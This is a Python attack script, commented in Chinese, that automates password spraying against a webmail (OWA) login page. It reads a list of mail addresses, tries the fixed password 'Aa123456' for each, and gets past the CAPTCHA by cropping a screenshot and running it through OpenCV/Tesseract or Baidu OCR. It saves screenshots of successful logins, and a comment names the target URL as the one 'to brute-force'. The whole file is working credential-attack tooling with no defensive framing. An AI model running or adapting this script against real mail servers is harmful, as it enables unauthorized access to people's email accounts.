from selenium import webdriver
import time
from PIL import Image
import os
import pytesseract
import cv2
from aip import AipOcr


#截取验证码并保存在本地
def GetCAPTCHA():
    #要暴力破的url
    url = 'https://backend.xxx.com/owa/auth/logon.aspx?xxx。。。'
    WebSave = os.getcwd()+'\\web.png'
    driver = webdriver.Firefox()
    driver.get(url)
    driver.maximize_window()
    time.sleep(2)
    # 1.登录页面截图并保存在当前文件夹
    driver.save_screenshot(WebSave)
    # 2通过id获取图片验证码坐标和尺寸
    CodeElement = driver.find_element_by_id('idpass')
    left = CodeElement.location['x']
    top = CodeElement.location['y']
    right = CodeElement.size['width'] + left
    height = CodeElement.size['height'] + top
    im = Image.open(WebSave)
    # 3.截取图片验证码
    img = im.crop((left, top, right, height))
    # 4.截取的验证码图片保存为新的文件
    img.save(WebSave,quality=95)
    # driver.close()

# 通过pytesseract识别验证码
def  RecognizCAPTCHA(image):
    # 边缘保留滤波  去噪
    blur = cv2.pyrMeanShiftFiltering(image, sp=8, sr=20)
    cv2.imshow('dst', blur)
    # 灰度图像
    gray = cv2.cvtColor(blur, cv2.COLOR_BGR2GRAY)
    # 二值化
    ret, binary = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)
    print(f'二值化自适应阈值：{ret}')
    cv2.imshow('binary', binary)

    cv2.imwrite(os.getcwd()+'\\web2.png',image)
    # 形态学操作  获取结构元素  开操作
    kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (3, 2))
    bin1 = cv2.morphologyEx(binary, cv2.MORPH_OPEN, kernel)
    cv2.imshow('bin1', bin1)
    kernel = cv2.getStructuringElement(cv2.MORPH_OPEN, (2, 3))
    # bin2 = cv2.morphologyEx(bin1, cv2.MORPH_OPEN, kernel)
    # cv2.imshow('bin2', bin2)
    # 逻辑运算  让背景为白色  字体为黑  便于识别
    # cv2.bitwise_not(bin2, bin2)
    # cv2.imshow('binary-image', bin2)
    cv2.bitwise_not(binary, binary)
    cv2.imshow('binary-image', binary)
    # 识别
    # test_message = Image.fromarray(bin2)
    test_message = Image.fromarray(binary)
    text = pytesseract.image_to_string(test_message)
    print(f'识别结果：{text}')
    with open(os.getcwd()+'\\CAPTCHAtest.txt','a') as f:
        f.write(text)
    # src = cv2.imread(r'./test/045.png')
    # cv2.imshow('input image', src)
    # recognize_text(src)
    # cv2.waitKey(0)
    # cv2.destroyAllWindows()

def BaiduAI():
    """ 你的 APPID AK SK """
    APP_ID = 'xxx'
    API_KEY = 'xxx'
    SECRET_KEY = 'xxx'
    client = AipOcr(APP_ID, API_KEY, SECRET_KEY)
    # 文字识别高精度版本
    """ 读取图片 """
    def get_file_content(filePath):
        with open(filePath, 'rb') as fp:
            return fp.read()
    image = get_file_content(os.getcwd()+'\\web.png')
    """ 带参数调用通用文字识别（高精度版） """
    # result = client.basicAccurate(image, options)
    result = client.basicAccurate(image)
    #result = client.basicGeneral(image)
    CAPTCHAFinal = str(result)[30:36]
    # with open('test.txt','r',encoding='utf-8') as test:
    #     CAPTCHAFinal = test.read()[30:36]
    with open('CAPTCHAReault.txt','a') as fr:
        fr.write(str(CAPTCHAFinal) + '\n')
        # fr.write(str(CAPTCHAFinal)[30:36]+'\n')
    return CAPTCHAFinal


if __name__ == '__main__':
    WebSave = os.getcwd()+'\\web.png'
    pw = 'Aa123456'
    for line in open(os.getcwd()+'\\MailAddress.txt'):
        user= ''.join(line.split())
        CAPTCHARightSave = os.getcwd()+'\\CAPTCHARightSaveScreen' + '\\' + user + '.png'
        CAPTCHAWrongSave = os.getcwd()+'\\CAPTCHAWrongSaveScreen' + '\\' + user + '.png'
        driver = webdriver.Firefox()
        driver.get('mail.xxx.com......')
        driver.maximize_window()
        time.sleep(2)
        # 1.登录页面截图并保存
        driver.save_screenshot(WebSave)
        # 2通过id获取图片验证码坐标和尺寸
        CodeElementCAPTCHA = driver.find_element_by_id('idpass')
        left = CodeElementCAPTCHA.location['x']
        top = CodeElementCAPTCHA.location['y']
        right = CodeElementCAPTCHA.size['width'] + left
        height = CodeElementCAPTCHA.size['height'] + top
        im = Image.open(WebSave)
        # 3.截取图片验证码
        img = im.crop((left, top, right, height))
        # 4.截取的验证码图片保存为新的文件
        img.save(WebSave, quality=95)
        # driver.close()
        CAPTCHA = BaiduAI()
        #以验证码内容命名验证码图片。若验证码中出现特殊字符，无法以验证码明明，则以用户名命名
        try:
            os.rename(os.getcwd()+'\\web.png', os.getcwd()+'\\'+ CAPTCHA +'.png')
        except Exception as e:
            os.rename(os.getcwd()+'\\web.png', os.getcwd()+'\\'+ user + '.png')
            print(e,'***',CAPTCHA)
        CodeElementUser = driver.find_element_by_id('username')
        CodeElementUser.send_keys(user)
        CodeElementPwd = driver.find_element_by_id('password')
        CodeElementPwd.send_keys(pw)
        CodeElementPwd = driver.find_element_by_id('captcha')
        CodeElementPwd.send_keys(CAPTCHA)
        CodeElementLogin = driver.find_element_by_class_name('imgLnk')
        CodeElementLogin.click()
        time.sleep(2)
        CodeElementPwd = driver.find_element_by_id('idpassEx')
        if (CodeElementPwd.text=='未完成驗證碼'):
            driver.save_screenshot(CAPTCHAWrongSave)
            driver.close()
        else:
            time.sleep(60)
            driver.save_screenshot(CAPTCHARightSave)
            driver.close()